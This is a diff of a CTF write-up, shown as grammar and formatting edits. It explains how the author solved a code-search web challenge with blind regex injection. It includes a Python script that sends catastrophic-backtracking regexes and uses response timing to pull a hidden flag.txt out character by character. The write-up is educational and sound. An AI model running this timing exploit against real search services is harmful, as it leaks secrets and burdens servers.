@@ -210,20 +210,19 @@ uoftctf{l337_15_p3rf3c7_f0r_fl465_4nd_3xp0n3n75}
 
 > 54 Solves
 
-This one was an challenge was really fun to solve. Here is the challenge description:
+This challenge was really fun to solve. Here is the challenge description:
 
 ![Welcome to CTRL+F the website! It's pretty much just GitHub code search.|400](https://i.imgur.com/WIv5aFr.png)
 
-
 #### Introduction
 
-In this challenge we basically an code search engine tool, where you are search for code using normal text or regex if you use this format `/regex/`.
+In this challenge, we basically had a code search engine tool, where you can search for code using normal text or a regex if you use the format `/regex/`.
 
 ![Code Search Tool where you can use regex](https://i.imgur.com/wSW65nZ.png)
 
 ---
 
-This was the file layout of the attachment we were given:
+Below is the file layout of the attachment we were given:
 
 ```
 ├── Dockerfile
@@ -249,36 +248,35 @@ This was the file layout of the attachment we were given:
         └── view_code.ejs
 ```
 
-Here is the little introduction of important file (for this challenge):
-* `app.js`
-	* Main express app. Has two end points:
-		* GET `/view/:fileName`
-			* Only get's files that are listed in `code_samples` (cannot retrieve flag.txt due to `visible: file !== 'flag.txt'`). 
-		* POST `/search`
-			* Searches for content of files inside of `code_samples`, based on the query (which could be text or regex).
-* `code_samples`
-	* List of files beings searched, including flag.txt
-* `searchWorker.js`
-	* The file that is actually doing the searching. It also generates a preview.
+Here is a short introduction of the important files (for this challenge):
 
-#### Semi-unsuccessful steps
+- **`app.js`**
+    - The main Express app. It has two endpoints:
+        - `GET /view/:fileName`
+            - Only retrieves files listed in `code_samples` (it cannot retrieve `flag.txt` due to `visible: file !== 'flag.txt'`).
+        - `POST /search`
+            - Searches for the content of files inside `code_samples`, based on the query (which could be text or regex).
+- **`code_samples`**
+    - A list of files being searched, including `flag.txt`.
+- **`searchWorker.js`**
+    - The file that actually performs the searching. It also generates a preview.
 
-Initially I started by downloading the given attachment (code for the application). Then first inspected the packages and checked if there were any known vulnerabilities with it. There were no vulnerabilities.
+#### Semi-unsuccessful Steps
 
-Then I started to slowly read the code. 
+Initially, I downloaded the attachment (the application's code) and inspected the packages to check for any known vulnerabilities, but there were none.
 
-It was not too difficult to read the application code, but it was very divided so had to take notes as I went down looking at the code.
+I then started to read the code slowly. It wasn’t too difficult, but it was divided into multiple files, so I had to take notes while reviewing it.
 
-Two main vulnerabilities that I suspected were:
+I suspected three main vulnerabilities:
+
 - Path Traversal
 - SSTI
-- Prototype pollution
+- Prototype Pollution
 
+I thought it might be prototype pollution because, while scanning through the code, I noticed unfiltered user input being used as a key. In hindsight, this was a mistake because there was no prototype pollution actually happening.
 
-I thought it might be an prototype pollution because of this. When I was briefly scanning though the code this stuck out since infiltered used input was being used as a key. On the hindsight, it was a mistake because there was not prototype pollution here.
-
-`src\app.js`
 ```js
+// src\app.js
 app.get('/view/:fileName', (req, res) => {
   const fileName = req.params.fileName;
   const fileData = filesIndex[fileName];
@@ -286,11 +284,10 @@ app.get('/view/:fileName', (req, res) => {
 });
 ```
 
+Next, I suspected there might be an issue with the `language` input, since it was unfiltered user input. However, this was not the case; the `language` input wasn’t used in a dangerous way.
 
-Next, I though there was an issue with the `language` input, since it was an unfiltered user input. However, that was not the case. The language user input was not doing anything interesting. 
-
-`src\app.js`
 ```js
+// src\app.js
 app.post('/search', async (req, res) => {
   const query = req.body.query.trim();
   const language = req.body.language;
@@ -298,8 +295,7 @@ app.post('/search', async (req, res) => {
 });
 ```
 
-
-When that looking at those did not work, I started suspecting SSTI in code preview feature mainly because search text was not being filtered properly. But I quickly dispelled that thought because frontend JavaScript was being used to render the SSTI. And I have not see a case where there was SSTI when the code sends a request to an API and gets a json response back, which then is processed by JavaScript to show the result (take this with grain of salt, just because I have not seen it does not mean it does not exist). 
+When looking into those didn’t help, I started suspecting SSTI in the code preview feature, mainly because search text wasn’t being filtered properly. However, I realized it was just frontend JavaScript rendering the results. I haven’t seen a case of SSTI occurring when the code simply sends a request to an API, gets a JSON response, and then processes it via JavaScript (though that doesn’t mean it’s impossible).
 
 ```js
 function generatePreview(content, matchIndices, previewLength) {
@@ -310,28 +306,28 @@ function generatePreview(content, matchIndices, previewLength) {
       preview.slice(match.end);
   });
   return (preview.includes("<mark></mark>")) ? null : preview;
+}
 ```
 
-
-> There were couple of other things that I considered and checked, but I won't bother mentioning them.
+> There were a couple of other considerations I looked into, but I won't go into detail about those.
 
 #### Solution
 
-While I was stuck in infinite loop of self doubt and searching for vulnerabilities. One of my team mates, gave this article: https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets (It is an interesting article, so pls do give it a read).
+While I was stuck in an infinite loop of self-doubt and searching for vulnerabilities, one of my teammates gave me this article:  
+[https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)  
+(It’s an interesting read, so please check it out.)
 
-The article also referred to "founder" of the attack: https://diary.shift-js.info/blind-regular-expression-injection/ (more technical read).
+The article also referred to the “founder” of the attack: [https://diary.shift-js.info/blind-regular-expression-injection/](https://diary.shift-js.info/blind-regular-expression-injection/) (a more technical read).
 
-It basically states that regex can be injected cleverer, like a blind SQL injection to retrieve information. You create a regex, if your regex matches then you cause ReDoS (Regular Expression Denial of Service). If there is a timeout in server response (e.g. server is slow to respond), you can assume that attack was successful. 
+It basically explains that regex can be injected in a clever way, similar to blind SQL injection, to retrieve information. You craft a regex so that if it matches, it causes ReDoS (Regular Expression Denial of Service). If there is a timeout in the server response (e.g., the server is slow to respond), you can assume the match happened.
 
-In our case, since the server implement timeout where your search "timeout" if it does not finish withing 1 second, we don't have to worry about causing DoS. 
+In our case, the server implements a timeout where your search “times out” if it doesn’t finish within 1 second, so we don’t really risk causing a full DoS.
 
-TLDR; You use ReDoS to determine secrets based on a time delay when executing regex.
+**TL;DR**: You use ReDoS to determine secrets based on the time delay when executing the regex.
 
+So, I wrote a Python script that checks for a time delay to determine whether the flag is correct or not.
 
-So i wrote a python script, that checks for time delay to determine if the flag is correct or not.
-
-
-> Reason why this exploit works is because there is a timeout preventing ReDoS attack and application is searching for all the files content, regardless of it's "visibility",
+> The reason this exploit works is because there’s a timeout that prevents full ReDoS, but the application still searches the content of _all_ files (including `flag.txt`) regardless of its “visibility”.
 
 ```python
 import requests
@@ -349,7 +345,7 @@ characters = f"{symbols}{string.ascii_lowercase}{string.digits}{string.ascii_upp
 possible_flag = "uoftctf{"
 while True:
     for char in characters:
-	    # Reference: https://diary.shift-js.info/blind-regular-expression-injection/
+        # Reference: https://diary.shift-js.info/blind-regular-expression-injection/
         query = "/^(?=^" + re.escape(f"{possible_flag}{char}") + ")((((.*)*)*)*)*salt/"
         payload = {
             "query": query,
@@ -362,7 +358,7 @@ while True:
         if seconds > timeout:
             possible_flag += char
             print("Building Flag:", possible_flag)
-            if (char == "}"):
+            if char == "}":
                 print("flag?")
                 break
     if bool(re.match(r"^uoftctf\{.*\}$", possible_flag)):
@@ -370,11 +366,9 @@ while True:
 print(possible_flag)
 ```
 
-> For the longest time I forgot to `re.escape(` so the regex started bugging out when it encountered "?". 
+> For the longest time, I forgot to use `re.escape()`, so the regex would break when it encountered “?”.
 
-Output:
-![](https://imgur.com/tmucn4V.png)
-
+**Output**: ![Script output screenshot](https://imgur.com/tmucn4V.png)
 
 -----
 ### Scavenger Hunt - 100
